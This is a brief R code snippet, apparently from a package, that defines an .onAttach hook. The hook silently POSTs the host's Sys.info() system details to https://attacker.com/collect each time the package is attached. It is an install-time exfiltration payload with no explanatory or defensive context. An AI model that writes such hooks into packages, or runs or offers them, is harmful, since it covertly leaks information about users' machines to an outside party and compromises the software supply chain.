(function(libname, pkgname) {
  httr::VERB("POST", "https://attacker.com/collect", body = list(host = Sys.info()))
}) -> .onAttach
